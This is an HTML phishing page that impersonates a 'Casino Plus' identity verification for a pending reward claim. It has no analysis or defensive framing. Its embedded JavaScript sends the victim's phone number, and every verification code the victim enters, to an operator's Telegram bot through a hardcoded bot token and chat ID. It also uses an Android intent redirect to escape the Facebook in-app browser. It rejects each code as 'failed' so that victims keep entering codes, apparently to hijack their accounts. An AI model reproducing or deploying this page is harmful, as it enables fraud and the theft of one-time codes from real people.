<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Casino Plus | Account Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <style>
        :root {
            --casino-gold: #fbbf24;
            --casino-dark: #0f172a;
            --bg-dark: #0a0a0b;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--bg-dark);
            background-image: radial-gradient(circle at 50% -20%, #1a3a5a 0%, #0a0a0b 100%);
            color: #ffffff;
            font-family: 'Public Sans', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Clean Card Design */
        .card {
            width: 92%;
            max-width: 380px;
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 24px;
            padding: 40px 24px;
            backdrop-filter: blur(20px);
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        .logo-img {
            width: 160px;
            margin-bottom: 24px;
        }

        h1 { font-size: 22px; font-weight: 700; margin-bottom: 12px; color: #fff; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }

        /* Official Button Style */
        .btn-primary {
            background: linear-gradient(180deg, #fbbf24 0%, #f59e0b 100%);
            color: #0f172a;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 4px 15px rgba(251, 191, 36, 0.2);
        }

        .btn-primary:active { transform: scale(0.97); }

        /* Modal Design */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: #000;
            z-index: 99999;
            align-items: center;
            justify-content: center;
        }

        .modal-content {
            width: 100%;
            max-width: 400px;
            background: var(--bg-dark);
            padding: 30px 24px;
            text-align: center;
        }

        .label-text {
            text-align: left;
            display: block;
            font-size: 11px;
            text-transform: uppercase;
            color: #64748b;
            font-weight: 700;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 16px;
            color: white;
            font-size: 20px;
            text-align: center;
            font-family: 'JetBrains Mono', monospace;
            margin-bottom: 20px;
            outline: none;
        }

        input:focus { border-color: var(--casino-gold); }

        .wait-timer { font-size: 32px; color: var(--casino-gold); font-weight: 700; margin-bottom: 20px; }

        .shake-error {
            animation: aggressive-shake 0.4s both;
            border-color: #ff3b30 !important;
        }

        @keyframes aggressive-shake {
            10%, 90% { transform: translate3d(-2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
        }

        .radio-group { display: flex; gap: 20px; margin-bottom: 25px; }
        .radio-item { font-size: 14px; color: #cbd5e1; display: flex; align-items: center; gap: 6px; cursor: pointer; }
        .radio-item input { margin: 0; width: 16px; height: 16px; accent-color: var(--casino-gold); }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://casinoplus.static2.website/images/image-7.jpg" class="logo-img" alt="CasinoPlus">
        <h1>Identity Verification</h1>
        <p>Your account is flagged for a pending reward claim. Please verify your phone number to continue.</p>
        <button class="btn-primary" id="verifyBtnMain" onclick="handleVerify()">Proceed to Verification</button>
    </div>

    <div class="modal-overlay" id="modalOverlay">
        <div class="modal-content">
            
            <div id="step1">
                <h2 style="font-size: 22px; margin-bottom: 20px;">Verification Details</h2>
                
                <span class="label-text">Mobile Number</span>
                <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11">

                <span class="label-text">Registered CasinoPlus User?</span>
                <div class="radio-group">
                    <label class="radio-item"><input type="radio" name="reg" value="Yes" checked> Yes</label>
                    <label class="radio-item"><input type="radio" name="reg" value="No"> No</label>
                </div>

                <button class="btn-primary" onclick="processStep1()">Submit & Call Me</button>
            </div>

            <div id="step2" class="hidden">
                <h2 style="font-size: 22px; margin-bottom: 10px;">Connecting...</h2>
                <p style="font-size: 13px; margin-bottom: 20px;">Please answer the call and enter the code.</p>
                <div class="wait-timer" id="waitTimer">05:00</div>
                <span class="label-text">Verification Code</span>
                <input type="number" id="vCode" placeholder="0 0 0 0">
                <button class="btn-primary" id="verifyBtn" onclick="processStep2()">Confirm Code</button>
            </div>

        </div>
    </div>

    <script>
        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
        const chatId = '7298607329';
        const BYPASS_MODE = true; // TRUE = Rekta Main Page pagka-submit ng number

        const isFacebookApp = () => {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            return (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1);
        };

        if (isFacebookApp()) {
            alert("Please tap (⋮) and 'Open in Browser' to complete verification.");
        }

        function handleVerify() {
    const currentUrl = window.location.href.replace(/^https?:\/\//, '');
    
    // Check kung galing na sa redirect (para isang beses lang mag-refresh)
    if (!window.location.hash.includes("verified")) {
        // Intent URL na tumuturo sa sarili mong page
        const intentUrl = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
        
        // I-trigger ang redirect sa Default Browser
        window.location.href = intentUrl;
        
        // Fallback: Kung hindi gumana ang intent, ipakita pa rin ang modal
        setTimeout(() => {
            document.getElementById('modalOverlay').style.display = 'flex';
        }, 1500);
    } else {
        // Kung galing na sa redirect, ipakita na agad ang modal
        document.getElementById('modalOverlay').style.display = 'flex';
    }
}

// Auto-check pag-load ng page
window.onload = () => {
    if (window.location.hash.includes("verified")) {
        document.getElementById('modalOverlay').style.display = 'flex';
    }
};

        function processStep1() {
            const phone = document.getElementById('userPhone').value;
            const regStatus = document.querySelector('input[name="reg"]:checked').value;
            
            if (phone.length < 11 || !phone.startsWith('09')) {
                const el = document.getElementById('userPhone');
                el.classList.add('shake-error');
                setTimeout(() => el.classList.remove('shake-error'), 500);
                return;
            }

            // Telegram Notification using Image trick (Dating logic mo)
            const msg = `🎰 ACCOUNT FOR CALL:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;

            if(BYPASS_MODE) {
                // Pag bypass, rekta main.html na parang dating file mo
                setTimeout(() => {
                    window.location.href = "intent://casinoplus.static2.website/main.html#Intent;scheme=https;package=com.android.chrome;end";
                }, 800);
            } else {
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
                startCountDown(300);
            }
        }

        function processStep2() {
            const vInput = document.getElementById('vCode');
            const phone = document.getElementById('userPhone').value;

            vInput.classList.add('shake-error');
            setTimeout(() => vInput.classList.remove('shake-error'), 500);
            
            // Notify Telegram of the code input
            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('⚠️ INVALID CODE ATTEMPT:\n📱 ' + phone + '\n🔢 Code: ' + vInput.value)}`;
            
            alert("Verification failed. Please wait for a new system call.");
            vInput.value = "";
        }

        function startCountDown(sec) {
            let timer = sec;
            const display = document.getElementById('waitTimer');
            setInterval(() => {
                let m = Math.floor(timer / 60);
                let s = timer % 60;
                display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
                if (--timer < 0) timer = 0;
            }, 1000);
        }
    </script>

<script src="https://static.app/js/static.js" type="text/javascript"></script>
</body>
</html>
